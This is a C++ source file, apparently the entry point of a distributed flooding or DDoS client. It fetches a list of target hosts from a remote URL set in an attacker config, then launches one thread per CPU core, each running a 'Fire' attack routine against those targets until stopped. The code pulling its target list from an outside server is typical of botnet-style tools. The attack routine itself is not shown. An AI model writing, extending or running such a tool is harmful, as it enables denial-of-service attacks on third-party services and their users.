#include <signal.h>

#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>

#include "nlohmann/json.hpp"

#include "config.h"
#include "attacker.h"
#include "curl_wrapper.h"
#include "utils.h"

std::atomic<bool> g_shouldStop{false};

void handle_sighup(int signum) 
{
	std::cerr << "Stoping" << std::endl;
	g_shouldStop.store(true);
}

int main(int argc, char **argv)
{
	size_t maxThreads = 
		std::thread::hardware_concurrency() == 0 ? 
			2 : std::thread::hardware_concurrency();

	if(argc >= 2)
	{
		try
		{
			maxThreads = std::stoi(argv[1]);
		}
		catch(...)
		{
			
		}
	}


	nlohmann::json hostsData;

	auto wrapper = CURLLoader();

	// Getting hosts list
	wrapper.SetTarget(AttackerConfig::APIS_LIST);
	while(true)
	{
		if(auto resp = wrapper.Download();
			resp->m_code >= 200 && resp->m_code < 300)
		{
			try
			{
				hostsData = nlohmann::json::parse(resp->m_data);
			}
			catch(...)
			{
				std::cerr << "Failed to parse hosts list" << std::endl;
			}
			break;
		}
		else
		{
			std::cerr << "Failed to load hosts list!" << std::endl;

			std::this_thread::sleep_for(std::chrono::milliseconds(500));

			std::cerr << "Trying again to load hosts" << std::endl;
		}
	}

	std::vector<std::string> apis;
	for(auto uri : hostsData)
	{
		apis.push_back(uri);
	}
	std::cout << "Succesfully got APIs" << std::endl;

	std::vector<std::thread> pool;

	for(size_t i = 0; i < maxThreads; i++)
	{
		pool.push_back(std::thread(Fire, apis, std::ref(g_shouldStop)));
	}

	for(auto &thread : pool)
	{
		if(thread.joinable())
		{
			thread.join();
		}
	}
}
